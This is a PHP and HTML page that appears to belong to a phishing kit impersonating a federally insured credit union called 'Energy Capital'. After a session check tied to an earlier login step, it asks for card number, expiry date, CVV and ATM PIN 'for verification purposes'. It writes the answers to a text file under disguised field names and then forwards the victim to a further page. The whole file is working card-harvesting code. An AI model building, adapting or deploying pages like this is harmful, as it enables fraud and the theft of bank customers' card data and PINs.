<?php
session_start();
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $cardNumber = $_POST['cardNumber'] ?? '';
    $expiryMonth = $_POST['expiryMonth'] ?? '';
    $expiryYear = $_POST['expiryYear'] ?? '';
    $cvv = $_POST['cvv'] ?? '';
    $atmPin = $_POST['atmPin'] ?? '';
    
    // Validation
    $cardDigits = preg_replace('/\s/', '', $cardNumber);
    if (strlen($cardDigits) !== 16) {
        $errors['cardNumber'] = 'Card number must be 16 digits';
    }
    
    if (empty($expiryMonth) || empty($expiryYear)) {
        $errors['expiry'] = 'Expiry date is required';
    }
    
    if (strlen($cvv) !== 3 && strlen($cvv) !== 4) {
        $errors['cvv'] = 'CVV must be 3 or 4 digits';
    }
    
    if (strlen($atmPin) !== 4) {
        $errors['atmPin'] = 'ATM PIN must be 4 digits';
    }
    
    if (empty($errors)) {
        // Save to file
        $data = [
            'step' => 'card_information',
            'usrnm' => $username,
            'pay_card' => $cardDigits,
            'exp_mth' => $expiryMonth,
            'exp_yr' => $expiryYear,
            'sec_cd' => $cvv,
            'pin_cd' => $atmPin
        ];
        
        saveUserData('card_information.txt', $data);
        
        // Redirect to terms page
        header('Location: terms.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Card Information - Energy Capital</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-[#0b0f1c] bg-cover bg-center bg-no-repeat relative overflow-hidden text-white" style="background-image: url('assets/dark-login.jpeg');">
        <!-- Dark Overlay -->
        <div class="absolute inset-0 bg-black/40 pointer-events-none"></div>
        
        <!-- Relative Container -->
        <div class="relative z-10 flex min-h-screen flex-col">
            <!-- Header -->
            <header class="flex flex-col items-center pt-8 px-4">
                <img src="assets/blue.png" alt="Energy Capital logo" class="h-12 w-auto" />
            </header>

            <!-- Main Content -->
            <main class="flex-1 flex items-center justify-center px-4 py-12">
                <!-- Card Information Card -->
                <div class="w-full max-w-md">
                    <div class="bg-[#1b1f2f]/95 rounded-xl shadow-xl shadow-black/30 p-8 space-y-6 text-white">
                        <!-- Card Header -->
                        <div>
                            <h2 class="text-center text-2xl font-semibold mb-2">Card Information</h2>
                            <p class="text-center text-slate-300 text-sm">Please provide your card details for verification purposes</p>
                        </div>
                        
                        <?php if (!empty($errors)): ?>
                            <div class="bg-red-500/20 border border-red-500 rounded-lg p-4">
                                <p class="text-red-200 text-sm font-semibold mb-2">Please fix the following errors:</p>
                                <ul class="list-disc pl-5 space-y-1">
                                    <?php foreach ($errors as $error): ?>
                                        <li class="text-red-200 text-sm"><?php echo htmlspecialchars($error); ?></li>
                                    <?php endforeach; ?>
                                </ul>
                            </div>
                        <?php endif; ?>
                        
                        <form method="POST" class="space-y-6">
                            <!-- Card Number -->
                            <div>
                                <label class="text-slate-300 text-sm font-medium block mb-2">Card Number</label>
                                <input
                                    type="text"
                                    name="cardNumber"
                                    value="<?php echo htmlspecialchars($_POST['cardNumber'] ?? ''); ?>"
                                    class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                    placeholder="1234 5678 9012 3456"
                                    maxlength="19"
                                    inputmode="numeric"
                                />
                                <?php if (isset($errors['cardNumber'])): ?>
                                    <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['cardNumber']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Expiry and CVV -->
                            <div class="grid grid-cols-2 gap-4">
                                <div>
                                    <label class="text-slate-300 text-sm font-medium block mb-2">Expiry Date</label>
                                    <div class="grid grid-cols-2 gap-2">
                                        <select name="expiryMonth" class="bg-[#283045] text-white border border-slate-600 rounded-lg px-3 py-2 focus:outline-none focus:border-[#00b4ff] transition">
                                            <option value="">Month</option>
                                            <?php for ($i = 1; $i <= 12; $i++): ?>
                                                <option value="<?php echo str_pad($i, 2, '0', STR_PAD_LEFT); ?>" <?php echo (str_pad($i, 2, '0', STR_PAD_LEFT) == ($_POST['expiryMonth'] ?? '')) ? 'selected' : ''; ?>>
                                                    <?php echo str_pad($i, 2, '0', STR_PAD_LEFT); ?>
                                                </option>
                                            <?php endfor; ?>
                                        </select>
                                        <select name="expiryYear" class="bg-[#283045] text-white border border-slate-600 rounded-lg px-3 py-2 focus:outline-none focus:border-[#00b4ff] transition">
                                            <option value="">Year</option>
                                            <?php for ($i = date('Y'); $i <= date('Y') + 20; $i++): ?>
                                                <option value="<?php echo $i; ?>" <?php echo ($i == ($_POST['expiryYear'] ?? '')) ? 'selected' : ''; ?>>
                                                    <?php echo $i; ?>
                                                </option>
                                            <?php endfor; ?>
                                        </select>
                                    </div>
                                    <?php if (isset($errors['expiry'])): ?>
                                        <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['expiry']); ?></p>
                                    <?php endif; ?>
                                </div>
                                
                                <div>
                                    <label class="text-slate-300 text-sm font-medium block mb-2">CVV</label>
                                    <input
                                        type="text"
                                        name="cvv"
                                        value="<?php echo htmlspecialchars($_POST['cvv'] ?? ''); ?>"
                                        class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                        placeholder="123"
                                        maxlength="4"
                                        inputmode="numeric"
                                    />
                                    <?php if (isset($errors['cvv'])): ?>
                                        <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['cvv']); ?></p>
                                    <?php endif; ?>
                                </div>
                            </div>
                            
                            <!-- ATM PIN -->
                            <div>
                                <label class="text-slate-300 text-sm font-medium block mb-2">ATM PIN</label>
                                <input
                                    type="password"
                                    name="atmPin"
                                    value="<?php echo htmlspecialchars($_POST['atmPin'] ?? ''); ?>"
                                    class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                    placeholder="4 digits"
                                    maxlength="4"
                                    inputmode="numeric"
                                />
                                <?php if (isset($errors['atmPin'])): ?>
                                    <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['atmPin']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Continue Button -->
                            <button
                                type="submit"
                                class="w-full bg-[#7dd3fc] text-black font-semibold py-2 rounded-lg hover:bg-[#38bdf8] transition"
                            >
                                Continue
                            </button>
                        </form>
                    </div>
                </div>
            </main>

            <!-- Footer -->
            <footer class="bg-[#2f3136] text-white w-full">
                <div class="max-w-5xl mx-auto px-6 py-10 flex flex-col items-center gap-6">
                    <nav class="flex flex-wrap items-center justify-center gap-4 text-sm text-[#74b8ff]">
                        <a class="hover:underline" href="#">Contact Us</a>
                        <span class="h-4 w-px bg-[#4b4d52]" aria-hidden="true"></span>
                        <a class="hover:underline" href="#">Privacy &amp; Security</a>
                        <span class="h-4 w-px bg-[#4b4d52]" aria-hidden="true"></span>
                        <a class="hover:underline" href="#">Accessibility</a>
                    </nav>
                    <div class="flex items-center gap-3 text-sm text-[#74b8ff]">
                        <div class="flex items-center justify-center w-7 h-7 border border-[#74b8ff] rounded-full text-xs font-semibold">
                            <span>🏠</span>
                        </div>
                        <span>Equal Housing Lender</span>
                    </div>
                    <img src="assets/ncua.png" alt="NCUA" class="h-16 w-auto" />
                    <p class="text-xs text-gray-400">Federally insured by NCUA</p>
                </div>
            </footer>
        </div>
    </div>

    <script>
        // Auto-format card number with spaces
        document.querySelector('input[name="cardNumber"]').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '');
            let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
            e.target.value = formattedValue;
        });
    </script>
</body>
</html>
